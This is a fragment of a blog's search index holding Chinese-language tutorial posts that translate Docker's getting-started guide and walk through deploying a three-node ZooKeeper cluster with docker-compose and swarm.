socket_timeout=2)app = Flask(__name__)@app.route("/")def hello(): try: visits = redis.incr("counter") except RedisError: visits = "&lt;i&gt;cannot connect to Redis, counter disabled&lt;/i&gt;" html = "&lt;h3&gt;Hello &#123;name&#125;!&lt;/h3&gt;" \ "&lt;b&gt;Hostname:&lt;/b&gt; &#123;hostname&#125;&lt;br/&gt;" \ "&lt;b&gt;Visits:&lt;/b&gt; &#123;visits&#125;" return html.format(name=os.getenv("NAME", "world"), hostname=socket.gethostname(), visits=visits)if __name__ == "__main__": app.run(host='0.0.0.0', port=80) 我们就看到刚刚的”pip install -r requirements.txt”,就是读取requirements.txt里的文件，安装Flask和Redis的库文件给Python。我们设置的环境变量NAME 为World ,那么代码里的socket.gethostname()就可以获取World。 建立我们的APP我们先看看我们现有的文件： 12$ lsDockerfile app.py requirements.txt 创建一个镜像，使用 -t 为它名一个友善的名字friendlyhello: 1docker build -t friendlyhello . 你可以使用docker images 或docker image ls查看镜像列表 运行我们的APP使用-p去映射宿主机的4000端口到容器的80端口： 1docker run -p 4000:80 friendlyhello 去打开我们的浏览器浏览http://localhost:4000 如果你使用的是Window 7 的Docker Toolbox ，请求不是localhost,而是http://192.168.99.100:4000。如果还不是，使用docker-machine ip 查看具体的Docker Machine IP 你也可以使用curl命令发起请求： 123$ curl http://localhost:4000&lt;h3&gt;Hello World!&lt;/h3&gt;&lt;b&gt;Hostname:&lt;/b&gt; 8fc990912a14&lt;br/&gt;&lt;b&gt;Visits:&lt;/b&gt; &lt;i&gt;cannot connect to Redis, counter disabled&lt;/i&gt; 使用Ctrl+C 退出以上的正在运行的容器 对于Window系统，可能Ctrl+C并不能完全退出，只是简单退出运行的页面，还得docker container ls查看正在运行的容器，接着就docker container stop &lt;Container NAME or ID&gt;来停止该容器 现在呢，我们来让容器在后台运行,使用-d： 1docker run -d -p 4000:80 friendlyhello 你就会得到一个很长的容器ID,这个容器已经在后台运行了，我们可以使用docker container ls来查看正在运行的容器。同时我们可以访问http://localhsot:4000。现在我们可以关闭该容器： 1docker container stop bb1dd75f205d 分享你的镜像使用Docker账号登录如果你还没有账号，请在cloud.docker.com注册。注册好后，在命令行登录： 1$docker login 为你的镜像打上标签Tag具体的语法：docker tag image username/repository:tag image：哪一个镜像名； username:用户名（一定要对上你的账户名）； repository:库名； tag ：版本号 例如：docker tag friendlyhello john/get-started:part2 发布你的镜像1docker push username/repository:tag 等一上传完后，可以登录Docker Hub，去查看你新分享的镜像。 拉取远程镜像并且运行它1docker run -p 4000:80 username/repository:tag 如果你本地没有这个镜像它会去远程拉取，否则运行本地的镜像。 总结12345678910111213141516docker build -t friendlyname . # 使用Dockerfile 创建一个镜像，并使用-t为镜像命名，注意别漏了最后那一点"."，它表示Dockerfile的当前目录。docker run -p 4000:80 friendlyname # 使用-p 映射宿主机的端口4000到容器的80端口，运行镜像docker run -d -p 4000:80 friendlyname #使用后台运行模式 -d docker container ls # 查看运行中的容器列表docker container ls -a # 查看所有容器，包括没有运行中的docker container stop &lt;hash&gt; # 根据hash值，停止容器docker container kill &lt;hash&gt; # 强行关闭某个容器docker container rm &lt;hash&gt; # 删除某个容器docker container rm $(docker container ls -a -q) # 删除所有容器docker image ls -a # 查看所有的镜像docker image rm &lt;image id&gt; # 根据镜像ID，删除镜像docker image rm $(docker image ls -a -q) # 删除所有的镜像docker login # 登录docker tag &lt;image&gt; username/repository:tag # 为某个镜像打上标签docker push username/repository:tag # 上次镜像到远程仓库docker run username/repository:tag # 从远程仓库里运行一个镜像，如果本地没有就先拉取再运行]]></content>
      <categories>
        <category>Docker</category>
        <category>Docker入门</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker入门-part1]]></title>
    <url>%2F2017%2F12%2F22%2Fdocker-part1%2F</url>
    <content type="text"><![CDATA[Docker HelloWorld前言本Docker入门系列文章是翻译于Docker官方getStarted文档,如有出入，请跳转查看官方文档 简单介绍容器 An image is a lightweight, stand-alone, executable package that includes everything needed to run a piece of software, including the code, a runtime, libraries, environment variables, and config files. 镜像是一种轻量级的、独立的、可执行的包，它包含运行一个软件所需的所有内容，包括代码、运行时、库、环境变量和配置文件。 A container is a runtime instance of an image—what the image becomes in memory when actually executed. It runs completely isolated from the host environment by default, only accessing host files and ports if configured to do so. 容器是镜像的运行时实例——当实际执行时，镜像会变成内存。默认情况下，它完全与主机环境隔离，如果配置为这样，则只能访问主机文件和端口。 Hello world1234567$ docker run hello-worldHello from Docker!This message shows that your installation appears to be working correctly.To generate this message, Docker took the following steps:...(snipped)...]]></content>
      <categories>
        <category>Docker</category>
        <category>Docker入门</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[在docker里部署zookeeper]]></title>
    <url>%2F2017%2F12%2F21%2Fdocker-zookeeper%2F</url>
    <content type="text"><![CDATA[部署Zookeeper单台机器部署3个zookeeper节点首先，初始化swarm 1docker swarm init 然后编辑一个文件,如下： docker-compose-single.yml 1234567891011121314151617181920212223242526272829303132333435363738394041version: '3.1'services: zoo1: image: zookeeper restart: always hostname: zoo1 ports: - 2181:2181 environment: ZOO_MY_ID: 1 ZOO_SERVERS: server.1=0.0.0.0:2888:3888 server.2=zoo2:2888:3888 server.3=zoo3:2888:3888 zoo2: image: zookeeper restart: always hostname: zoo2 ports: - 2182:2181 environment: ZOO_MY_ID: 2 ZOO_SERVERS: server.1=zoo1:2888:3888 server.2=0.0.0.0:2888:3888 server.3=zoo3:2888:3888 zoo3: image: zookeeper restart: always hostname: zoo3 ports: - 2183:2181 environment: ZOO_MY_ID: 3 ZOO_SERVERS: server.1=zoo1:2888:3888 server.2=zoo2:2888:3888 server.3=0.0.0.0:2888:3888 visualizer: image: dockersamples/visualizer:stable ports: - "8080:8080" volumes: - "/var/run/docker.sock:/var/run/docker.sock" deploy: placement: constraints: [node.role == manager] 以上的部署文件，定义了4个服务，3个zookeeper和visualizer，visualizer是一个可视化服务，待会你可以用浏览器访问8080端口，查看其他服务的可视化状态。 使用命令，查看zookeeper的启动情况： 1echo stat | nc 127.0.0.1 2181 或者 1echo stat | nc 127.0.0.1 2182 或者 1echo stat | nc 127.0.0.1 2183 如果显示如下内容，说明启动成功，zookeeper的容器已经绑定在你本机的2181,2182,2183端口上 123456789101112Zookeeper version: 3.4.11-37e277162d567b55a07d1755f0b31c32e93c01a0, built on 11/01/2017 18:06 GMTClients: /10.255.0.2:56420[0](queued=0,recved=1,sent=0)Latency min/avg/max: 0/0/0Received: 1Sent: 0Connections: 1Outstanding: 0Zxid: 0x0Mode: followerNode count: 4 怎么使用zkCli.sh登陆客户端呢： 首先, 123456docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES99ee6c7335cd zookeeper:latest "/docker-entrypoin..." 17 hours ago Up 17 hours 2181/tcp, 2888/tcp, 3888/tcp zoolab_zoo2.1.0rfczhfcn1782fzpb2d6ir2iq0148b0cc522f zookeeper:latest "/docker-entrypoin..." 17 hours ago Up 17 hours 2181/tcp, 2888/tcp, 3888/tcp zoolab_zoo3.1.981cslrn7zqegvvp90r5vx5dme534fd292d3f zookeeper:latest "/docker-entrypoin..." 17 hours ago Up 17 hours 2181/tcp, 2888/tcp, 3888/tcp zoolab_zoo1.1.k45vcu9hqmzsxf8fg56b5hlx812e9ab6ae214 dockersamples/visualizer:stable "npm start" 17 hours ago Up 17 hours 8080/tcp zoolab_visualizer.1.hbg9c9sx9zd2c3obcaa9nbwgi 找到zookeeper的容器id : 99ee6c7335cd，0148b0cc522f，e534fd292d3f 我们现在选择一个容器id，进入容器: 12345678docker exec -it 99ee6c7335cd bashbash-4.4# lsLICENSE.txt bin dist-maven lib zookeeper-3.4.11.jar.ascNOTICE.txt build.xml docs recipes zookeeper-3.4.11.jar.md5README.md conf ivy.xml src zookeeper-3.4.11.jar.sha1README_packaging.txt contrib ivysettings.xml zookeeper-3.4.11.jarbash-4.4# ./bin/zkCli.sh （直接回车即可登陆zk客户端） 即可使用 zk 的 ls , get ,set ,create 等命令, 为了验证3个zookeeper之间的数据是互通的 我们可以登陆到一个容器里的zkCli创建一个节点数据： 123#容器99ee6c7335cd里的zkCli里输入[zk: localhost:2181(CONNECTED) 1] create /test 123456Created /test 我们登陆到另一台的容器的zkCli里： 1234567891011121314#容器0148b0cc522f里的zkCli里输入[zk: localhost:2181(CONNECTED) 1] get /test123456cZxid = 0x100000002ctime = Thu Dec 21 03:29:15 GMT 2017mZxid = 0x100000002mtime = Thu Dec 21 03:29:15 GMT 2017pZxid = 0x100000002cversion = 0dataVersion = 0aclVersion = 0ephemeralOwner = 0x0dataLength = 6numChildren = 0 如果在其他的容器里的zkCli能获取其他容器创建的节点数据，说明他们的数据是互通的。 多台机器部署3个zookeeper节点由于我们没有这么多台机器，我们将虚拟出其他3台虚拟机。 使用docker-machine 模拟3台机器： Mac,Linux,Win7,Win8 使用virtualbox 首先，您需要一个可以创建虚拟机(vm)的管理程序，因此为您的机器的操作系统安装Oracle VirtualBox。然后使用以下命令创建多台虚拟机 123docker-machine create --driver virtualbox myvm1docker-machine create --driver virtualbox myvm2docker-machine create --driver virtualbox myvm3 Win10 使用 hyper-V 登陆Hyper-V 管理系统 点击右边菜单的Virtual Switch Manager 在External里点击Create Virtual Switch 给给他一个名字myswitch ,选中该复选框以共享主机的活动网络适配器 现在，使用我们的节点管理工具docker-machine创建几个vm 123docker-machine create -d hyperv --hyperv-virtual-switch "myswitch" myvm1docker-machine create -d hyperv --hyperv-virtual-switch "myswitch" myvm2docker-machine create -d hyperv --hyperv-virtual-switch "myswitch" myvm3 接下来我们创建一个部署文件： docker-compose-swarm.yml12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152version: '3.1'services: zoo1: image: zookeeper restart: always hostname: zoo1 ports: - 2181:2181 environment: ZOO_MY_ID: 1 ZOO_SERVERS: server.1=zoo1:2888:3888 server.2=zoo2:2888:3888 server.3=zoo3:2888:3888 networks: - webnet zoo2: image: zookeeper restart: always hostname: zoo2 ports: - 2182:2181 environment: ZOO_MY_ID: 2 ZOO_SERVERS: server.1=zoo1:2888:3888 server.2=zoo2:2888:3888 server.3=zoo3:2888:3888 networks: - webnet zoo3: image: zookeeper restart: always hostname: zoo3 ports: - 2183:2181 environment: ZOO_MY_ID: 3 ZOO_SERVERS: server.1=zoo1:2888:3888 server.2=zoo2:2888:3888 server.3=zoo3:2888:3888 networks: - webnet visualizer: image: dockersamples/visualizer:stable ports: - 8080:8080 volumes: - "/var/run/docker.sock:/var/run/docker.sock" deploy: placement: constraints: [node.role == manager] networks: - webnetnetworks: webnet: driver: overlay 好了，在我们部署之前，我们需要定义好，myvm1为manager,myvm2和myvm3为worker。所以，我们先登陆到myvm1里去初始化swarm(前面也初始化过swarm,不过是单台机器)，然后把myvm2和myvm3加入到这个swarm中，最后才运行部署文件。具体操作如下： 设置终端环境我们不是要去登陆到myvm1里，而是获取myvm1的终端环境到本机的终端，在本机终端操作，从而操作虚拟机。 Mac,Linux 123456789101112docker-machine env myvm1#按提示，继续输入命令：eval $(docker-machine env myvm1)#查看docker-machine lsNAME ACTIVE DRIVER STATE URL SWARM DOCKER ERRORSmyvm1 * virtualbox Running tcp://192.168.99.100:2376 v17.06.2-ce myvm2 - virtualbox Running tcp://192.168.99.101:2376 v17.06.2-ce 在myvm1 旁边多了个星号，表示成功 Winodow 12345678910111213docker-machine env myvm1#按提示，继续输入命令：&amp; "C:\Program Files\Docker\Docker\Resources\bin\docker-machine.exe" env myvm1 | Invoke-Expression#查看docker-machine lsNAME ACTIVE DRIVER STATE URL SWARM DOCKER ERRORSmyvm1 * hyperv Running tcp://192.168.203.207:2376 v17.06.2-cemyvm2 - hyperv Running tcp://192.168.200.181:2376 v17.06.2-ce在myvm1 旁边多了个星号，表示成功 我们获取好myvm1终端环境，然后我们初始化swarm 12345678docker swarm init --advertise-addr &lt;myvm1 ip&gt;Swarm initialized: current node &lt;node ID&gt; is now a manager.To add a worker to this swarm, run the following command: docker swarm join \ --token &lt;token&gt; \ &lt;myvm ip&gt;:&lt;port&gt; 它这里提示我们登陆到其他的worker里,输入它上面给出的命令。 1234567#获取myvm2的终端环境eval $(docker-machine env myvm2)#加入swarmdocker swarm join \ --token &lt;token&gt; \ &lt;myvm ip&gt;:&lt;port&gt; 类似的，我们把myvm3也加入swarm来。 现在我们要登陆到myvm1里，因为它是manager,用它来进行部署 12345678#登陆myvm1eval $(docker-machine env myvm1)#部署docker stack deploy -c docker-compose-swarm.yml zklab#查看docker stack ps zklab 验证zookeeper 123echo stat | nc &lt;myvm1/2/3 ip&gt; 2181echo stat | nc &lt;myvm1/2/3 ip&gt; 2182echo stat | nc &lt;myvm1/2/3 ip&gt; 2183 用浏览器查看：http://myvm1/2/3_ip:8080]]></content>
      <categories>
        <category>Docker</category>
        <category>部署例子</category>
        <category>Zookeeper</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>Zookeeper</tag>
      </tags>
  </entry>
</search>
